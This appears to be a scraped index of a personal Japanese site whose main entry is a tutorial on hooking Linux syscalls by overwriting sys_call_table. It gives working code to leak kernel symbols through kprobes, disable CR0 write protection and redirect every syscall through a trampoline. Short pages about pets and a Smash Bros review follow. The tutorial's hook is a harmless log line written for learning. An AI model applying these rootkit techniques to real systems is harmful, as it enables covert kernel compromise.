こいつらを展開するのはめんどいので、知りたい人はこのへん読んでください。取り敢えずのところ、__x64_sys_xxx()がpt_regsから値を取り出してハンドラ本体の引数として渡すということだけ理解してればOKです。ちょうどこの関数が、syscall tableに登録されていた各syscallのハンドラですね。\nフックできる場所 さて、ここまでの流れの中でフックに使えそうなポイントは2つくらいです。ほんとはもっとあるかもしれないけど。\nまずは、sys_call_tableの中に入っている各syscallのエントリポイント(__x64_sys_xxx())を書き換えちゃうこと。これはなんか簡単そうですね。 もう一つが、MSRを書き換えてそもそものエントリポイントを書き換えちゃうこと。こっちはアセンブラでentry_SYSCALL_64のカスタム版を実装して自作のdo_syscall_64()を呼び出す必要があるので、ちょっとめんどくさそうですね。しかしながら、用意に監視され得るkernel領域を書き換えるのではなくレジスタ値のみを書き換えればいいので、研究の文脈でいうとこっちのほうが有用だったりします。しなかったりもします。\n今回は、前者のsys_call_table内のエントリを書き換える方法でいきます。\nsys_call_table hooking 概略を言うと、sys_call_tableの中の関数ポインタを書き換えて、自作の関数に飛ばします。基本的にはそれだけです。\nsys_call_tableのリーク そもそもに、sys_call_tableはexportされていません。なので、リークする必要があります。一昔前はkallsyms_lookup_name()という、任意のシンボルアドレスを教えてくれる便利関数がexportされていたらしいんですが、こいつもv5.7からひきこもりになってしまいました。なので、どうやってリークすれば良いのか迷ったんですが、まぁ有用なrootkitを作る必要はないので適当にkprobes使ってリークすることにしましょう。堂々とね！\nulong get_kallsyms_lookup_name_addr (void) { ulong _kallsyms_lookup_name_addr; struct kprobe test_kp ={ .symbol_name = \"kallsyms_lookup_name\", }; if (register_kprobe(\u0026test_kp) \u003c 0) { pr_err(\"Failed to get addr of kallsyms_lookup_name.\"); return 0; }; _kallsyms_lookup_name_addr = (ulong)test_kp.addr; unregister_kprobe(\u0026test_kp); return _kallsyms_lookup_name_addr; } あとはkallsyms_lookup_name()を使えば任意のシンボルをリークできます。\nWP-bitとsys_call_tableの書き換え 単純にsys_call_table[0] = 0xDEADBEEFとかってやると、permission errorでpanicします。これはsys_call_tableの入ってるページにwrite protectionがかかっており、そこで発生したトラップハンドラの中で権限チェックされて落ちるからです。この書き込み保護はCR3レジスタのWPビットをいじると無効化出来ます。kernelにはnative_write_cr0()という関数がexportされています:\nvoid native_write_cr0(unsigned long val) { unsigned long bits_missing = 0; set_register: asm volatile(\"mov %0,%%cr0\": \"+r\" (val) : : \"memory\"); if (static_branch_likely(\u0026cr_pinning)) { if (unlikely((val \u0026 X86_CR0_WP) != X86_CR0_WP)) { bits_missing = X86_CR0_WP; val |= bits_missing; goto set_register; } /* Warn after we've set the missing bits. */ WARN_ONCE(bits_missing, \"CR0 WP bit went missing!?\\n\"); } } EXPORT_SYMBOL(native_write_cr0); 小癪なことに、WPビットが立っていない場合には警告を出した上で無理やりWPを建てていますね。なので、自分で関数を用意してあげましょう:\nstatic void inline nosec_write_cr0(unsigned long val) { asm volatile(\"mov %0,%%cr0\": \"+r\" (val) : : \"memory\"); } あとはこんな感じで書き換えてあげればOK:\nstatic void disable_write_protection(void) { ulong cr0 = read_cr0(); clear_bit(16, \u0026cr0); nosec_write_cr0(cr0); } static void enable_write_protection(void) { ulong cr0 = read_cr0(); set_bit(16, \u0026cr0); nosec_write_cr0(cr0); } フック関数 フックの問題点 さて、sys_call_tableを書き換える準備が整いました。あとは、sys_call_tableの中身を書き換える関数を用意してあげればOKです。取り敢えずは全てのsyscallをプリフックしてpr_info(\"NIRUGIRI\")と挨拶するようにしたいと考えましょう:\nint hijack_syscall_table_entries (void) { int ix; disable_write_protection(); for (ix = 0; ix \u003c nr_syscall_max - 1; ix++) { ((ulong *)sys_call_table)[ix] = (ulong)syscall_prehook; } enable_write_protection(); return 0; } static inline long syscall_prehook(struct pt_regs *regs) { pr_info(\"NIRUGIRI\"); return cloned_sys_call_table[nr](regs); } 書き換えを行う関数で使っているsys_call_tableは、リークしたkallsyms_lookup_name()を使ってアドレスを調べておく必要があります。同様に、nr_syscall_maxもexportされていないため調べておく必要があります(単純にテーブルの中でNULLが出るまでのエントリ数をカウントすればOK)。\nフック関数ではpr_info()したあとで、オリジナルのハンドラを呼び出しています。cloned_sys_call_tableは、オリジナルのsys_call_tableのクローンです。sys_call_table内の関数ポインタは全てsyscall_prehook()へのポインタに書き換えるため、オリジナルのハンドラを記憶しておく必要があり、こいつがそれをしてくれます。\nさて、ここで問題が発生しました。nrの値が分かりません。do_syscall_64には第1引数(RDI)としてnrが渡されるのですが、この値はsys_call_table[nr](regs)命令の最中に消されてしまいます:\nffffffff81ba82a0 \u003cdo_syscall_64\u003e: ffffffff81ba82a0: 55 push rbp ffffffff81ba82a1: 49 89 f8 mov r8,rdi ffffffff81ba82a4: 48 89 e5 mov rbp,rsp ffffffff81ba82a7: 41 54 push r12 ffffffff81ba82a9: 49 89 f4 mov r12,rsi ffffffff81ba82ac: 0f 1f 44 00 00 nop DWORD PTR [rax+rax*1+0x0] ffffffff81ba82b1: 4c 89 c6 mov rsi,r8 ffffffff81ba82b4: 4c 89 e7 mov rdi,r12 ffffffff81ba82b7: e8 b4 32 00 00 call ffffffff81bab570 \u003csyscall_enter_from_user_mode\u003e ffffffff81ba82bc: 48 3d be 01 00 00 cmp rax,0x1be ffffffff81ba82c2: 77 21 ja ffffffff81ba82e5 \u003cdo_syscall_64+0x45\u003e ffffffff81ba82c4: 48 3d bf 01 00 00 cmp rax,0x1bf ffffffff81ba82ca: 48 19 d2 sbb rdx,rdx ffffffff81ba82cd: 48 21 d0 and rax,rdx ffffffff81ba82d0: 4c 89 e7 mov rdi,r12 ffffffff81ba82d3: 48 8b 04 c5 40 02 00 mov rax,QWORD PTR [rax*8-0x7dfffdc0] ffffffff81ba82da: 82 ffffffff81ba82db: e8 80 b2 25 00 call ffffffff81e03560 \u003c__x86_indirect_thunk_rax\u003e ffffffff81ba82bc (syscall_enter_from_user_mode)の時点では、RAXにnrが入っています。しかしながら、ffffffff81ba82d3においてRAXにはsys_call_table[nr]の値が入ってしまいます。これによって、nrは完全に消えてしまいます。nrが分からないと、フック関数の中でどのオリジナルハンドラを呼び出せば良いのかが分かりません。悲しいですね。\nnrを調べる しかしながら、唯一の希望としてRAXにはハンドラのアドレスが入っているということが分かっています。これだけだと、結局ハンドラのアドレス自体は全てプリフック関数のアドレスであるためnrの判定は不可能ですが、ここは少しhackyにいきましょう。まず、以下のようなカスマクロを用意します:\n#define REPEAT_1(x) x #define REPEAT_2(x) REPEAT_1(x) x #define REPEAT_4(x) REPEAT_2(x) REPEAT_2(x) #define REPEAT_8(x) REPEAT_4(x) REPEAT_4(x) #define REPEAT_16(x) REPEAT_8(x) REPEAT_8(x) #define REPEAT_32(x) REPEAT_16(x) REPEAT_16(x) #define REPEAT_64(x) REPEAT_32(x) REPEAT_32(x) #define REPEAT_128(x) REPEAT_64(x) REPEAT_64(x) #define REPEAT_256(x) REPEAT_128(x) REPEAT_128(x) #define REPEAT_512(x) REPEAT_256(x) REPEAT_256(x) マクロを繰り返してくれるマクロです。因みに、自前で用意しなくてもBoostライブラリがBOOST_PP_REPEATというマクロを用意してくれてるらしいので、それを使ってもいいです。そのあと、以下のような関数を作ります:\n#define JMP_INST \\ asm volatile(\"push %0\" : : \"i\" (jmp_thread)); \\ asm volatile(\"ret\"); #define JMP_THREAD \\ REPEAT_512(JMP_INST) static inline void jmp_thread(void) { asm volatile(\"jmp *%0\" : : \"r\" (syscall_prehook) : \"rax\"); JMP_THREAD } jmp_thread()関数の中では、先程用意したマクロによって512回分だけJMP_INSTが展開されます。JMP_INSTは、jmp_thread()に対してジャンプするようなアセンブラ命令を展開します。jmp_thread()をコンパイルすると、こんな感じになります:\n000000000000e405 \u003cjmp_thread\u003e: e405: 48 c7 c2 00 00 00 00 mov rdx,0x0 e40c: ff e2 jmp rdx e40e: 68 00 00 00 00 push 0x0 e413: c3 ret e414: 68 00 00 00 00 push 0x0 e419: c3 ret e41a: 68 00 00 00 00 push 0x0 e41f: c3 ret e420: 68 00 00 00 00 push 0x0 e425: c3 ret e426: 68 00 00 00 00 push 0x0 e42b: c3 ret e42c: 68 00 00 00 00 push 0x0 e431: c3 ret e432: 68 00 00 00 00 push 0x0 e437: c3 ret e438: 68 00 00 00 00 push 0x0 e43d: c3 ret ... 最初のmov rdx,0x0はsyscall_prehook()のアドレスが、push 0x0となっているところには、後ほどjmp_threadのアドレスが入ります。勘の良い人ならお気づきの通り、syscallテーブル内のポインタを、jmp_thread内の異なるpush \u0026 ret命令のアドレスに書き換えることで、全てのsyscallハンドラのアドレスが異なりつつも同じプリフック関数を呼び出すことが出来ます:\nint hijack_syscall_table_entries (void) { int ix; disable_write_protection(); for (ix = 0; ix \u003c nr_syscall_max - 1; ix++) { ((ulong *)sys_call_table)[ix] = (ulong)jmp_thread + 0x9 + 6 * ix; } enable_write_protection(); return 0; } 0x9は最初のsyscall_prehook()に飛ぶ命令長で、6はpush \u0026 ret1つ分の命令長です。これで、全てのハンドラは最終的にsyscall_prehook()に飛びますが、そのアドレスは微妙に異なっているためsyscall_prehook()内でRAXを調べることにより、もとのnrを得ることが出来ます:\nstatic inline long syscall_prehook(struct pt_regs *regs) { ulong rax, nr; asm volatile(\"mov %%rax, %0\" : \"=r\" (rax)); nr = (rax - (ulong)jmp_thread - 9) / 6; pr_info(\"NIRUGIRI\"); return cloned_sys_call_table[nr](regs); } やったね！\n因みに、asm volatile(\"jmp *%0\" : : \"r\" (syscall_prehook) : \"rax\")で適切にregister constraintを指定しないと、RAXがworking regsとして利用されてしまい、せっかく保持されているハンドラのアドレスが消え去ってしまいます。今回はraxを指定しているため、代わりにrdxが使われています。この辺のインラインアセンブラについては、これが詳しい感じがするので読みたい人はどうぞ。\nそれから、JMP_INSTを\"jmp *%0\" : : \"r\" (jmp_thread)ではなくpush \u0026 retにしている理由ですが、前者にした場合アセンブラは以下のようになってしまいます:\n000000000000e405 \u003cjmp_thread\u003e: e405: 48 c7 c2 00 00 00 00 mov rdx,0x0 e40c: ff e2 jmp rdx e40e: 48 c7 c0 00 00 00 00 mov rax,0x0 e415: ff e0 jmp rax e417: ff e0 jmp rax e419: ff e0 jmp rax e41b: ff e0 jmp rax e41d: ff e0 jmp rax e41f: ff e0 jmp rax e421: ff e0 jmp rax e423: ff e0 jmp rax e425: ff e0 jmp rax ... 最初に一度だけraxにjmp_threadの値を入れたっきり、二度と代入してくれませんね…。これでは、syscallハンドラからjmp_thread()の途中に飛んだ時、すでにRAXに入っているアドレス、すなわち今現在のアドレスにジャンプすることになり、無限ジャンプを引き起こしてしまいます。というわけで、push \u0026 retにしたらいい感じに繰り返してくれる上に、レジスタ値を損なわなくて済むので、今回はそうなりました。\n","categories":"","description":"System Call Tableを上書きしてのフック","excerpt":"System Call Tableを上書きしてのフック","ref":"/cameyes/syscall/table-hook/","tags":"","title":"Table Overwrite"},{"body":"","categories":"","description":"","excerpt":"","ref":"/tags/","tags":"","title":"Tags"},{"body":"このセクションについて かーびぃがすきなものを集めるよ。\nすごく書きかけだよ。すきなものは、たくさんあるよ。 動物 しば犬: この世の創造主だよ。あのもふもふで、且つしゃんと張った胸と尻尾が好きだよ。人生の最終目標はしば犬を2匹と暮らすことだよ。\nラブラドールレトリバー: 大きい犬が好きだよ。\nシベリアンハスキー: 大きくて狼みたいな犬が好きだよ。\n秋田犬: 大きな犬が好きだよ。\nきつね: ほぼ犬だよ。\nねこ: 短毛種は好きじゃないよ。長毛種もあんまり好きじゃないよ。くらげが好きだよ。いわしっていう名前つけて羊をめぐる冒険に行ってみたいね。\n","categories":"","description":"かーびぃのすきなものこれくしょん","excerpt":"かーびぃのすきなものこれくしょん","ref":"/smallkirby/likes/","tags":"","title":"すきなもの"},{"body":"概要 プレイ情報 タイトル 大乱闘スマッシュブラザーズ SPECIAL 会社 任天堂 発売 2018 プレイ時期 2018.12.7 ~ 総プレイ時間 1500h + 個人的スコア 総合スコア 10.0/10.0 中毒度 9.0/10.0 息の長さ 10.0/10.0 感想 紛うことなき神ゲー。パーティゲーであり、格ゲーでもある。\nスマブラはDXを親戚の家で少しやったところから始まり、Xに大いにドハマりした。当時はオンラインとかはやらずに兄弟が友達とひたすらプレイしていたため、メタナイトがぶっ壊れとかは全く知らなかった。forUは丁度受験期だったためやっておらず、SPの発売を待ち望んでいた。発売日から今日に至るまで、未だに同じ熱量でプレイし続けている。\nパーティゲーであり、ガチゲー 任天堂公式的にはパーティゲーとしての側面を推したがっている気がする。勿論パーティゲーとしてかなり優秀で、スマブラきっかけで話が深まったこともあるし、今のバイトはスマブラきっかけで始めたと言っても過言ではない。\nしかしながら、スマブラの良いところはガチの格ゲーとしても遊べるところ。ゲームはやっぱり学習要素がないと長続きしない。その点スマブラは、上手い人のプレイ動画を見たり、沢山開催されている大会動画を見たり、ひたすらトレーニングモードで反復練習したりと、「腕を上げる」楽しみで溢れている。パーティゲーを推している一方で、VIP部屋という格ゲー勢にもちゃんと配慮し続けてくれている任天堂には感謝しかない。\n今の持ちキャラは、ルフレ・マルス・カービィ・ルカリオ・ミュウツー・ドンキーです。ルカリオはそろそろクビにしようと思います。\n他のゲームへの橋渡しにもなる スマブラに登場するからという理由でプレイしてみたゲームが結構ある。ファイアーエムブレム風花雪月は最たる例で、スマブラに出てくるからなんとなく始めてみたら、自分の中で片手の指に入るくらい好きなゲームになった(再来週に迫ったエンゲージの発売が待ちきれない)。また、ペルソナ5もスマブラきっかけで初めて、PS4(P5)とSwitch(P5R)の両方でプレイした。ホムヒカ参戦後はゼノブレイド2もやった(マップの見にくさと、キャラがはまらなくて途中で断念したけど)。3が出たので3もやった(こっちは全クリした)。Miiのコスプレが出たときにはUndertaleもやったし、金銀以来やっていなかったポケモンも出てるしやっておくか〜ということで剣盾・アルセウス・SVをやった。サムスはメトロイド自体やっていないものの、メトロイドを調べているときにメトロイドヴァニアというジャンルを知り、それきっかけでEnder Liliesをやった。\nメーカーを問わず色んな会社が出てくれてすげ〜〜と思ってたけど、こうして参戦キャラのゲームをやるきっかけになっており、宣伝効果は絶大なんだと思う。\n唯一の欠点は、次回作が不安 これ以上のゲーム、あり得るか？？？？？？？？\n過去作全キャラ出てるし、有名IPから沢山参戦してるし、ゲームスピードもかなりスピーディでストレスないし、Xのメタ程のぶっ壊れは居ないし。桜井さんがこれで満足してしまって、次回作が出ないんじゃないかということだけが、唯一の不安。もう5年経ちますよ…….!\n本ページ中の画像・タイトル等は全て Nintendo Co., Ltd の著作物です。\n","categories":"","description":"2018, すべてがスマブラ史上最大規模!!","excerpt":"2018, すべてがスマブラ史上最大規模!!","ref":"/gaming/smashultimate/","tags":"","title":"大乱闘スマッシュブラザーズ SPECIAL"}]